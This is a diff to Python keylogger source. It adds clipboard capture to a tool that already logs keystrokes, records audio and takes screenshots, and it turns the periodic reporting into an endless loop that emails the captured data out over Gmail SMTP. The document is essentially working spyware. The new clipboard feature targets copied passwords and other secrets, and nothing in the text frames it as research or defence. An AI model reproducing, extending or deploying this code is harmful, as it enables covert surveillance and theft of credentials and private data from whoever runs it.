@@ -4,6 +4,7 @@ import smtplib
 import threading
 import wave
 import sounddevice as sd
+import pyperclip
 from pynput import keyboard, mouse
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -83,17 +84,23 @@ class KeyLogger:
         except Exception as e:
             logging.error(f"Error taking screenshot: {e}")
 
+    def capture_clipboard(self):
+        try:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content:
+                self.append_log(f"Clipboard Data: {clipboard_content}")
+        except Exception as e:
+            logging.error(f"Error capturing clipboard: {e}")
+
     def send_email(self):
         try:
             msg = MIMEMultipart()
             msg["From"] = self.email
-            msg["To"] = self.email  # Update with actual recipient
+            msg["To"] = self.email  
             msg["Subject"] = "Keylogger Report"
 
-            # Attach log file
             msg.attach(MIMEText(self.log, "plain"))
 
-            # Attach audio file
             if os.path.exists(self.audio_file):
                 with open(self.audio_file, "rb") as f:
                     audio_part = MIMEBase("application", "octet-stream")
@@ -102,7 +109,6 @@ class KeyLogger:
                 audio_part.add_header("Content-Disposition", f"attachment; filename={self.audio_file}")
                 msg.attach(audio_part)
 
-            # Attach screenshot
             if os.path.exists(self.screenshot_file):
                 with open(self.screenshot_file, "rb") as f:
                     screenshot_part = MIMEBase("image", "png")
@@ -111,7 +117,6 @@ class KeyLogger:
                 screenshot_part.add_header("Content-Disposition", f"attachment; filename={self.screenshot_file}")
                 msg.attach(screenshot_part)
 
-            # Send email
             with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                 server.login(self.email, self.password)
                 server.send_message(msg)
@@ -120,7 +125,6 @@ class KeyLogger:
         except Exception as e:
             logging.error(f"Error sending email: {e}")
         finally:
-            # Cleanup
             if os.path.exists(self.audio_file):
                 os.remove(self.audio_file)
             if os.path.exists(self.screenshot_file):
@@ -130,12 +134,13 @@ class KeyLogger:
         self.append_log("Keylogger started.")
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as key_listener, \
                 mouse.Listener() as mouse_listener:
-            timer = threading.Timer(self.interval, self.send_email)
-            timer.start()
+            while True:
+                self.capture_clipboard()
+                time.sleep(self.interval)
+                self.send_email()
             key_listener.join()
             mouse_listener.join()
 
 
-# Start Keylogger
 keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
 keylogger.run()
